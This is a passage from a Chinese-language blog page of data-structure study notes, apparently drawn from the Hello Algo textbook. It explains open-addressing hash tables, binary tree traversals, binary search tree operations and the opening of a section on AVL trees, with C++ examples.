class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 开放寻址哈希表 */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMapOpenAddressing</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> size;                             <span class="hljs-comment">// 键值对数量</span><br>    <span class="hljs-type">int</span> capacity = <span class="hljs-number">4</span>;                     <span class="hljs-comment">// 哈希表容量</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">double</span> loadThres = <span class="hljs-number">2.0</span> / <span class="hljs-number">3.0</span>;     <span class="hljs-comment">// 触发扩容的负载因子阈值</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> extendRatio = <span class="hljs-number">2</span>;            <span class="hljs-comment">// 扩容倍数</span><br>    vector&lt;Pair *&gt; buckets;               <span class="hljs-comment">// 桶数组</span><br>    Pair *TOMBSTONE = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Pair</span>(<span class="hljs-number">-1</span>, <span class="hljs-string">&quot;-1&quot;</span>); <span class="hljs-comment">// 删除标记</span><br><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/* 构造方法 */</span><br>    <span class="hljs-built_in">HashMapOpenAddressing</span>() : <span class="hljs-built_in">size</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">buckets</span>(capacity, <span class="hljs-literal">nullptr</span>) &#123;<br>    &#125;<br><br>    <span class="hljs-comment">/* 析构方法 */</span><br>    ~<span class="hljs-built_in">HashMapOpenAddressing</span>() &#123;<br>        <span class="hljs-keyword">for</span> (Pair *pair : buckets) &#123;<br>            <span class="hljs-keyword">if</span> (pair != <span class="hljs-literal">nullptr</span> &amp;&amp; pair != TOMBSTONE) &#123;<br>                <span class="hljs-keyword">delete</span> pair;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">delete</span> TOMBSTONE;<br>    &#125;<br><br>    <span class="hljs-comment">/* 哈希函数 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">hashFunc</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> key % capacity;<br>    &#125;<br><br>    <span class="hljs-comment">/* 负载因子 */</span><br>    <span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">loadFactor</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-type">double</span>)size / capacity;<br>    &#125;<br><br>    <span class="hljs-comment">/* 搜索 key 对应的桶索引 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findBucket</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-type">int</span> index = <span class="hljs-built_in">hashFunc</span>(key);<br>        <span class="hljs-type">int</span> firstTombstone = <span class="hljs-number">-1</span>;<br>        <span class="hljs-comment">// 线性探测，当遇到空桶时跳出</span><br>        <span class="hljs-keyword">while</span> (buckets[index] != <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-comment">// 若遇到 key ，返回对应的桶索引</span><br>            <span class="hljs-keyword">if</span> (buckets[index]-&gt;key == key) &#123;<br>                <span class="hljs-comment">// 若之前遇到了删除标记，则将键值对移动至该索引处</span><br>                <span class="hljs-keyword">if</span> (firstTombstone != <span class="hljs-number">-1</span>) &#123;<br>                    buckets[firstTombstone] = buckets[index];<br>                    buckets[index] = TOMBSTONE;<br>                    <span class="hljs-keyword">return</span> firstTombstone; <span class="hljs-comment">// 返回移动后的桶索引</span><br>                &#125;<br>                <span class="hljs-keyword">return</span> index; <span class="hljs-comment">// 返回桶索引</span><br>            &#125;<br>            <span class="hljs-comment">// 记录遇到的首个删除标记</span><br>            <span class="hljs-keyword">if</span> (firstTombstone == <span class="hljs-number">-1</span> &amp;&amp; buckets[index] == TOMBSTONE) &#123;<br>                firstTombstone = index;<br>            &#125;<br>            <span class="hljs-comment">// 计算桶索引，越过尾部则返回头部</span><br>            index = (index + <span class="hljs-number">1</span>) % capacity;<br>        &#125;<br>        <span class="hljs-comment">// 若 key 不存在，则返回添加点的索引</span><br>        <span class="hljs-keyword">return</span> firstTombstone == <span class="hljs-number">-1</span> ? index : firstTombstone;<br>    &#125;<br><br>    <span class="hljs-comment">/* 查询操作 */</span><br>    <span class="hljs-function">string <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-comment">// 搜索 key 对应的桶索引</span><br>        <span class="hljs-type">int</span> index = <span class="hljs-built_in">findBucket</span>(key);<br>        <span class="hljs-comment">// 若找到键值对，则返回对应 val</span><br>        <span class="hljs-keyword">if</span> (buckets[index] != <span class="hljs-literal">nullptr</span> &amp;&amp; buckets[index] != TOMBSTONE) &#123;<br>            <span class="hljs-keyword">return</span> buckets[index]-&gt;val;<br>        &#125;<br>        <span class="hljs-comment">// 若键值对不存在，则返回空字符串</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 添加操作 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">put</span><span class="hljs-params">(<span class="hljs-type">int</span> key, string val)</span> </span>&#123;<br>        <span class="hljs-comment">// 当负载因子超过阈值时，执行扩容</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">loadFactor</span>() &gt; loadThres) &#123;<br>            <span class="hljs-built_in">extend</span>();<br>        &#125;<br>        <span class="hljs-comment">// 搜索 key 对应的桶索引</span><br>        <span class="hljs-type">int</span> index = <span class="hljs-built_in">findBucket</span>(key);<br>        <span class="hljs-comment">// 若找到键值对，则覆盖 val 并返回</span><br>        <span class="hljs-keyword">if</span> (buckets[index] != <span class="hljs-literal">nullptr</span> &amp;&amp; buckets[index] != TOMBSTONE) &#123;<br>            buckets[index]-&gt;val = val;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// 若键值对不存在，则添加该键值对</span><br>        buckets[index] = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Pair</span>(key, val);<br>        size++;<br>    &#125;<br><br>    <span class="hljs-comment">/* 删除操作 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-comment">// 搜索 key 对应的桶索引</span><br>        <span class="hljs-type">int</span> index = <span class="hljs-built_in">findBucket</span>(key);<br>        <span class="hljs-comment">// 若找到键值对，则用删除标记覆盖它</span><br>        <span class="hljs-keyword">if</span> (buckets[index] != <span class="hljs-literal">nullptr</span> &amp;&amp; buckets[index] != TOMBSTONE) &#123;<br>            <span class="hljs-keyword">delete</span> buckets[index];<br>            buckets[index] = TOMBSTONE;<br>            size--;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* 扩容哈希表 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">extend</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">// 暂存原哈希表</span><br>        vector&lt;Pair *&gt; bucketsTmp = buckets;<br>        <span class="hljs-comment">// 初始化扩容后的新哈希表</span><br>        capacity *= extendRatio;<br>        buckets = <span class="hljs-built_in">vector</span>&lt;Pair *&gt;(capacity, <span class="hljs-literal">nullptr</span>);<br>        size = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// 将键值对从原哈希表搬运至新哈希表</span><br>        <span class="hljs-keyword">for</span> (Pair *pair : bucketsTmp) &#123;<br>            <span class="hljs-keyword">if</span> (pair != <span class="hljs-literal">nullptr</span> &amp;&amp; pair != TOMBSTONE) &#123;<br>                <span class="hljs-built_in">put</span>(pair-&gt;key, pair-&gt;val);<br>                <span class="hljs-keyword">delete</span> pair;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* 打印哈希表 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (Pair *pair : buckets) &#123;<br>            <span class="hljs-keyword">if</span> (pair == <span class="hljs-literal">nullptr</span>) &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;nullptr&quot;</span> &lt;&lt; endl;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pair == TOMBSTONE) &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;TOMBSTONE&quot;</span> &lt;&lt; endl;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                cout &lt;&lt; pair-&gt;key &lt;&lt; <span class="hljs-string">&quot; -&gt; &quot;</span> &lt;&lt; pair-&gt;val &lt;&lt; endl;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><ol start="2"><li>平方探测：</li></ol><p>平方探测与线性探测类似，都是开放寻址的常见策略之一。当发生冲突时，平方探测不是简单地跳过一个固定的步数，而是跳过“探测次数的平方”的步数，即$1,4,9,…$步。</p><p>平方探测主要具有以下优势。</p><ul><li>平方探测通过跳过探测次数平方的距离，试图缓解线性探测的聚集效应。</li><li>平方探测会跳过更大的距离来寻找空位置，有助于数据分布得更加均匀。</li></ul><p>然而，平方探测并不是完美的。</p><ul><li>仍然存在聚集现象，即某些位置比其他位置更容易被占用。</li><li>由于平方的增长，平方探测可能不会探测整个哈希表，这意味着即使哈希表中有空桶，平方探测也可能无法访问到它。</li></ul><ol start="3"><li>多次哈希：</li></ol><p>顾名思义，多次哈希方法使用多个哈希函数$f_1(x)$、$f_2(x)$、$f_3(x)$ …进行探测。</p><ul><li><strong>插入元素</strong>：若哈希函数$f_1(x)$出现冲突，则尝试$f_2(x)$，以此类推，直到找到空位后插入元素。</li><li><strong>查找元素</strong>：在相同的哈希函数顺序下进行查找，直到找到目标元素时返回；若遇到空位或已尝试所有哈希函数，说明哈希表中不存在该元素，则返回 <code>None</code> 。</li></ul><p>与线性探测相比，多次哈希方法不易产生聚集，但多个哈希函数会带来额外的计算量。</p><p class="note note-success">请注意，开放寻址（线性探测、平方探测和多次哈希）哈希表都存在“不能直接删除元素”的问题。</p><h3 id="第7章-二叉树"><a href="#第7章-二叉树" class="headerlink" title="第7章 二叉树"></a>第7章 二叉树</h3><h4 id="二叉树遍历"><a href="#二叉树遍历" class="headerlink" title="二叉树遍历"></a>二叉树遍历</h4><p>从物理结构的角度来看，树是一种基于链表的数据结构，因此其遍历方式是通过指针逐个访问节点。然而，树是一种非线性数据结构，这使得遍历树比遍历链表更加复杂，需要借助搜索算法来实现。</p><p>二叉树常见的遍历方式包括层序遍历、前序遍历、中序遍历和后序遍历等。</p><h5 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h5><p>如图所示，层序遍历（level-order traversal）从顶部到底部逐层遍历二叉树，并在每一层按照从左到右的顺序访问节点。</p><p>层序遍历本质上属于广度优先遍历（breadth-first traversal），也称广度优先搜索（breadth-first search, BFS），它体现了一种“一圈一圈向外扩展”的逐层遍历方式。</p><p><img src="https://www.hello-algo.com/chapter_tree/binary_tree_traversal.assets/binary_tree_bfs.png" srcset="/img/loading.gif" lazyload></p><p>广度优先遍历通常借助“队列”来实现。队列遵循“先进先出”的规则，而广度优先遍历则遵循“逐层推进”的规则，两者背后的思想是一致的。实现代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 层序遍历 */</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">levelOrder</span><span class="hljs-params">(TreeNode *root)</span> </span>&#123;<br>    <span class="hljs-comment">// 初始化队列，加入根节点</span><br>    queue&lt;TreeNode *&gt; queue;<br>    queue.<span class="hljs-built_in">push</span>(root);<br>    <span class="hljs-comment">// 初始化一个列表，用于保存遍历序列</span><br>    vector&lt;<span class="hljs-type">int</span>&gt; vec;<br>    <span class="hljs-keyword">while</span> (!queue.<span class="hljs-built_in">empty</span>()) &#123;<br>        TreeNode *node = queue.<span class="hljs-built_in">front</span>();<br>        queue.<span class="hljs-built_in">pop</span>();              <span class="hljs-comment">// 队列出队</span><br>        vec.<span class="hljs-built_in">push_back</span>(node-&gt;val); <span class="hljs-comment">// 保存节点值</span><br>        <span class="hljs-keyword">if</span> (node-&gt;left != <span class="hljs-literal">nullptr</span>)<br>            queue.<span class="hljs-built_in">push</span>(node-&gt;left); <span class="hljs-comment">// 左子节点入队</span><br>        <span class="hljs-keyword">if</span> (node-&gt;right != <span class="hljs-literal">nullptr</span>)<br>            queue.<span class="hljs-built_in">push</span>(node-&gt;right); <span class="hljs-comment">// 右子节点入队</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> vec;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="前序、中序、后序遍历"><a href="#前序、中序、后序遍历" class="headerlink" title="前序、中序、后序遍历"></a>前序、中序、后序遍历</h5><p>相应地，前序、中序和后序遍历都属于深度优先遍历（depth-first traversal），也称深度优先搜索（depth-first search, DFS），它体现了一种“先走到尽头，再回溯继续”的遍历方式。</p><p>图中展示了对二叉树进行深度优先遍历的工作原理。<strong>深度优先遍历就像是绕着整棵二叉树的外围“走”一圈</strong>，在每个节点都会遇到三个位置，分别对应前序遍历、中序遍历和后序遍历。</p><p><img src="https://www.hello-algo.com/chapter_tree/binary_tree_traversal.assets/binary_tree_dfs.png" srcset="/img/loading.gif" lazyload></p><p>深度优先搜索通常基于递归实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 前序遍历 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">preOrder</span><span class="hljs-params">(TreeNode *root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 访问优先级：根节点 -&gt; 左子树 -&gt; 右子树</span><br>    vec.<span class="hljs-built_in">push_back</span>(root-&gt;val);<br>    <span class="hljs-built_in">preOrder</span>(root-&gt;left);<br>    <span class="hljs-built_in">preOrder</span>(root-&gt;right);<br>&#125;<br><br><span class="hljs-comment">/* 中序遍历 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">inOrder</span><span class="hljs-params">(TreeNode *root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 访问优先级：左子树 -&gt; 根节点 -&gt; 右子树</span><br>    <span class="hljs-built_in">inOrder</span>(root-&gt;left);<br>    vec.<span class="hljs-built_in">push_back</span>(root-&gt;val);<br>    <span class="hljs-built_in">inOrder</span>(root-&gt;right);<br>&#125;<br><br><span class="hljs-comment">/* 后序遍历 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">postOrder</span><span class="hljs-params">(TreeNode *root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 访问优先级：左子树 -&gt; 右子树 -&gt; 根节点</span><br>    <span class="hljs-built_in">postOrder</span>(root-&gt;left);<br>    <span class="hljs-built_in">postOrder</span>(root-&gt;right);<br>    vec.<span class="hljs-built_in">push_back</span>(root-&gt;val);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h4><p>如图所示，二叉搜索树（binary search tree）满足以下条件。</p><ol><li>对于根节点，左子树中所有节点的值 $&lt;$ 根节点的值 $&lt;$ 右子树中所有节点的值。</li><li>任意节点的左、右子树也是二叉搜索树，即同样满足条件 <code>1.</code> 。</li></ol><p><img src="https://www.hello-algo.com/chapter_tree/binary_search_tree.assets/binary_search_tree.png" srcset="/img/loading.gif" lazyload></p><h5 id="查找节点"><a href="#查找节点" class="headerlink" title="查找节点"></a>查找节点</h5><p>给定目标节点值 <code>num</code> ，可以根据二叉搜索树的性质来查找。我们声明一个节点 <code>cur</code> ，从二叉树的根节点 <code>root</code> 出发，循环比较节点值 <code>cur.val</code> 和 <code>num</code> 之间的大小关系。</p><ul><li>若 <code>cur.val &lt; num</code> ，说明目标节点在 <code>cur</code> 的右子树中，因此执行 <code>cur = cur.right</code> 。</li><li>若 <code>cur.val &gt; num</code> ，说明目标节点在 <code>cur</code> 的左子树中，因此执行 <code>cur = cur.left</code> 。</li><li>若 <code>cur.val = num</code> ，说明找到目标节点，跳出循环并返回该节点。</li></ul><p>二叉搜索树的查找操作与二分查找算法的工作原理一致，都是每轮排除一半情况。循环次数最多为二叉树的高度，当二叉树平衡时，使用$O(logn)$时间。</p><h5 id="插入节点"><a href="#插入节点" class="headerlink" title="插入节点"></a>插入节点</h5><p>给定一个待插入元素 <code>num</code> ，为了保持二叉搜索树“左子树 &lt; 根节点 &lt; 右子树”的性质，插入操作流程如图所示。</p><ol><li><strong>查找插入位置</strong>：与查找操作相似，从根节点出发，根据当前节点值和 <code>num</code> 的大小关系循环向下搜索，直到越过叶节点（遍历至 <code>None</code>）时跳出循环。</li><li><strong>在该位置插入节点</strong>：初始化节点 <code>num</code> ，将该节点置于 <code>None</code> 的位置。</li></ol><p><img src="https://www.hello-algo.com/chapter_tree/binary_search_tree.assets/bst_insert.png" srcset="/img/loading.gif" lazyload></p><p>在代码实现中，需要注意以下两点。</p><ul><li>二叉搜索树不允许存在重复节点，否则将违反其定义。因此，若待插入节点在树中已存在，则不执行插入，直接返回。</li><li>为了实现插入节点，我们需要借助节点 <code>pre</code> 保存上一轮循环的节点。这样在遍历至 <code>None</code> 时，我们可以获取到其父节点，从而完成节点插入操作。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 插入节点 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>    <span class="hljs-comment">// 若树为空，则初始化根节点</span><br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) &#123;<br>        root = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(num);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    TreeNode *cur = root, *pre = <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-comment">// 循环查找，越过叶节点后跳出</span><br>    <span class="hljs-keyword">while</span> (cur != <span class="hljs-literal">nullptr</span>) &#123;<br>        <span class="hljs-comment">// 找到重复节点，直接返回</span><br>        <span class="hljs-keyword">if</span> (cur-&gt;val == num)<br>            <span class="hljs-keyword">return</span>;<br>        pre = cur;<br>        <span class="hljs-comment">// 插入位置在 cur 的右子树中</span><br>        <span class="hljs-keyword">if</span> (cur-&gt;val &lt; num)<br>            cur = cur-&gt;right;<br>        <span class="hljs-comment">// 插入位置在 cur 的左子树中</span><br>        <span class="hljs-keyword">else</span><br>            cur = cur-&gt;left;<br>    &#125;<br>    <span class="hljs-comment">// 插入节点</span><br>    TreeNode *node = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(num);<br>    <span class="hljs-keyword">if</span> (pre-&gt;val &lt; num)<br>        pre-&gt;right = node;<br>    <span class="hljs-keyword">else</span><br>        pre-&gt;left = node;<br>&#125;<br></code></pre></td></tr></table></figure><p>与查找节点相同，插入节点使用$O(logn)$时间。</p><h5 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h5><p>先在二叉树中查找到目标节点，再将其删除。与插入节点类似，我们需要保证在删除操作完成后，二叉搜索树的“左子树 &lt; 根节点 &lt; 右子树”的性质仍然满足。因此，我们根据目标节点的子节点数量，分 0、1 和 2 三种情况，执行对应的删除节点操作。</p><p>如图所示，当待删除节点的度为0时，表示该节点是叶节点，可以直接删除。</p><p><img src="https://www.hello-algo.com/chapter_tree/binary_search_tree.assets/bst_remove_case1.png" srcset="/img/loading.gif" lazyload></p><p>当待删除节点的度为1时，将待删除节点替换为其子节点即可。</p><p><img src="https://www.hello-algo.com/chapter_tree/binary_search_tree.assets/bst_remove_case2.png" srcset="/img/loading.gif" lazyload></p><p>当待删除节点的度为2时，我们无法直接删除它，而需要使用一个节点替换该节点。由于要保持二叉搜索树“左子节点 &lt; 根节点 &lt; 右子节点”的性质，<strong>因此这个节点可以是右子树的最小节点或左子树的最大节点</strong>。</p><p>假设我们选择右子树的最小节点（中序遍历的下一个节点），则删除操作流程为：</p><ol><li>找到待删除节点在“中序遍历序列”中的下一个节点，记为 <code>tmp</code> 。</li><li>用 <code>tmp</code> 的值覆盖待删除节点的值，并在树中递归删除节点 <code>tmp</code> 。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 删除节点 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>    <span class="hljs-comment">// 若树为空，直接提前返回</span><br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">return</span>;<br>    TreeNode *cur = root, *pre = <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-comment">// 循环查找，越过叶节点后跳出</span><br>    <span class="hljs-keyword">while</span> (cur != <span class="hljs-literal">nullptr</span>) &#123;<br>        <span class="hljs-comment">// 找到待删除节点，跳出循环</span><br>        <span class="hljs-keyword">if</span> (cur-&gt;val == num)<br>            <span class="hljs-keyword">break</span>;<br>        pre = cur;<br>        <span class="hljs-comment">// 待删除节点在 cur 的右子树中</span><br>        <span class="hljs-keyword">if</span> (cur-&gt;val &lt; num)<br>            cur = cur-&gt;right;<br>        <span class="hljs-comment">// 待删除节点在 cur 的左子树中</span><br>        <span class="hljs-keyword">else</span><br>            cur = cur-&gt;left;<br>    &#125;<br>    <span class="hljs-comment">// 若无待删除节点，则直接返回</span><br>    <span class="hljs-keyword">if</span> (cur == <span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 子节点数量 = 0 or 1</span><br>    <span class="hljs-keyword">if</span> (cur-&gt;left == <span class="hljs-literal">nullptr</span> || cur-&gt;right == <span class="hljs-literal">nullptr</span>) &#123;<br>        <span class="hljs-comment">// 当子节点数量 = 0 / 1 时， child = nullptr / 该子节点</span><br>        TreeNode *child = cur-&gt;left != <span class="hljs-literal">nullptr</span> ? cur-&gt;left : cur-&gt;right;<br>        <span class="hljs-comment">// 删除节点 cur</span><br>        <span class="hljs-keyword">if</span> (cur != root) &#123;<br>            <span class="hljs-keyword">if</span> (pre-&gt;left == cur)<br>                pre-&gt;left = child;<br>            <span class="hljs-keyword">else</span><br>                pre-&gt;right = child;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 若删除节点为根节点，则重新指定根节点</span><br>            root = child;<br>        &#125;<br>        <span class="hljs-comment">// 释放内存</span><br>        <span class="hljs-keyword">delete</span> cur;<br>    &#125;<br>    <span class="hljs-comment">// 子节点数量 = 2</span><br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 获取中序遍历中 cur 的下一个节点</span><br>        TreeNode *tmp = cur-&gt;right;<br>        <span class="hljs-keyword">while</span> (tmp-&gt;left != <span class="hljs-literal">nullptr</span>) &#123;<br>            tmp = tmp-&gt;left;<br>        &#125;<br>        <span class="hljs-type">int</span> tmpVal = tmp-&gt;val;<br>        <span class="hljs-comment">// 递归删除节点 tmp</span><br>        <span class="hljs-built_in">remove</span>(tmp-&gt;val);<br>        <span class="hljs-comment">// 用 tmp 覆盖 cur</span><br>        cur-&gt;val = tmpVal;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="中序遍历有序"><a href="#中序遍历有序" class="headerlink" title="中序遍历有序"></a>中序遍历有序</h5><p>如图所示，二叉树的中序遍历遵循“左$\rightarrow$根$\rightarrow$右”的遍历顺序，而二叉搜索树满足“左子节点 &lt; 根节点 &lt; 右子节点”的大小关系。</p><p>这意味着在二叉搜索树中进行中序遍历时，总是会优先遍历下一个最小节点，从而得出一个重要性质：<strong>二叉搜索树的中序遍历序列是升序的</strong>。</p><p>利用中序遍历升序的性质，我们在二叉搜索树中获取有序数据仅需$O(n)$时间，无须进行额外的排序操作，非常高效。</p><p><img src="https://www.hello-algo.com/chapter_tree/binary_search_tree.assets/bst_inorder_traversal.png" srcset="/img/loading.gif" lazyload></p><h4 id="AVL树"><a href="#AVL树" class="headerlink" title="AVL树"></a>AVL树</h4><p>在“二叉搜索树”章节中我们提到，在多次插入和删除操作后，二叉搜索树可能退化为链表。在这种情况下，所有操作的时间复杂度将从$O(logn)$劣化为$O(n)$。</p><p>1962 年 G. M. Adelson-Velsky 和 E. M. Landis 在论文“An algorithm for the organization of information”中提出了 AVL 树。论文中详细描述了一系列操作，确保在持续添加和删除节点后，AVL 树不会退化，从而使得各种操作的时间复杂度保持在$O(logn)$级别。换句话说，在需要频繁进行增删查改操作的场景中，AVL 树能始终保持高效的数据操作性能，具有很好的应用价值。</p><h5 id="AVL树常见术语"><a href="#AVL树常见术语" class="headerlink" title="AVL树常见术语"></a>AVL树常见术语</h5><p>AVL 树既是二叉搜索树，也是平衡二叉树，同时满足这两类二叉树的所有性质，因此是一种平衡二叉搜索树。</p><ol><li>节点高度</li></ol><p>由于 AVL 树的相关操作需要获取节点高度，因此我们需要为节点类添加 <code>height</code> 变量：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* AVL 树节点类 */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span> &#123;<br>    <span class="hljs-type">int</span> val&#123;&#125;;          <span class="hljs-comment">// 